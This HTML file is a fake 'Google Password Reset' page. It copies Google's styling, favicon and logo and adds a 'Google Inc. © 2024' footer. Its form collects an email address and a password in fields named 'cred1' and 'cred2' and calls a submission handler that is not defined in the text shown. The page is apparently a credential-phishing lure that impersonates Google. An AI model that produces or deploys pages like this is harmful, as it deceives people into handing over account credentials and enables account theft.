<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Password Reset</title>
    <style>
        /* Google-like styling */
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: white;
            width: 100%;
            max-width: 360px;
            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }

        .google-logo {
            margin-bottom: 20px;
        }

        .google-logo img {
            width: 100px;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #333;
        }

        .input-field {
            width: 80%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
        }

        .input-field:focus {
            border-color: #4285f4;
        }

        .btn {
            background-color: #4285f4;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
        }

        .btn:hover {
            background-color: #357ae8;
        }

        .footer {
            margin-top: 30px;
            color: #777;
            font-size: 12px;
        }

        /* Responsive layout */
        @media (max-width: 400px) {
            .container {
                padding: 15px;
                width: 90%;
            }

            .google-logo img {
                width: 80px;
            }

            h1 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Google logo -->
        <div class="google-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/272px-Google_2015_logo.svg.png" alt="Google Logo">



        </div>

        <!-- Page Title -->
        <h1>Reset your password</h1>

        <!-- Form -->
        <form id="resetForm" onsubmit="handleFormSubmission();">
            <!-- Email Input -->
             
            <input id="cred1" type="email" class="input-field" placeholder="Enter your email" required>

            <!-- Password Input -->
            <input id="cred2" type="password" class="input-field" placeholder="Enter new password" required>

            <!-- Confirm Password Input -->
            <input type="password" class="input-field" placeholder="Confirm new password" required>

            <!-- Submit Button -->
            <button type="submit" class="btn">Reset Password</button>
        </form>

        <!-- Footer -->
        <div class="footer">
            <p>Google Inc. Â© 2024 - All rights reserved</p>
        </div>
        <div id="status">

        </div>
    </div>



    
</body>
</html>
